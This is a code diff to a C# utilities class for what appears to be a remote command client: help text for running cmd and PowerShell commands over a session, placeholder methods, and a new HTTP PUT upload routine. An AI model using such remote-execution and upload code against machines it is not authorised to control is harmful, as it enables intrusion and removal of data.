@@ -13,8 +13,24 @@ class Utilities
             " ----------------------------------------------------------\n" +
             "   <command>               Run cmd command [Default]" +
             "   help                    Print this message\n" +
-            "   terminate               Close the client connection\n" +
-            "   powershell <command>    Run powershell command\n";
+            "   powershell <command>    Run powershell command\n" +
+            "   session                 Get session ID\n" +
+            "   terminate               Close the client connection\n";
+
+    }
+
+    // File to byte[]
+    public static byte[] FileToByte(string location, string filename)
+    {
+        string filepath = String.Concat(location, Path.DirectorySeparatorChar, filename);
+        return new byte[0];
+    }
+
+
+    // Interactive Command Line Protection
+    public static bool CliProtection(string cmd)
+    {
+        return true;
     }
 
     // Check Root Dir
@@ -66,5 +82,17 @@ class Utilities
             return reader.ReadToEnd();
         }
     }
+
+    // HTTP Put Request
+    public static string Put(string uri, byte[] data, string sessionid, string method = "PUT")
+    {
+        using(var client = new System.Net.WebClient())
+        {
+            client.Headers.Add("Session-Id", sessionid);
+            client.UploadData(uri, method, data);
+        }
+        return "File uploaded";
+    }
+
 }
     
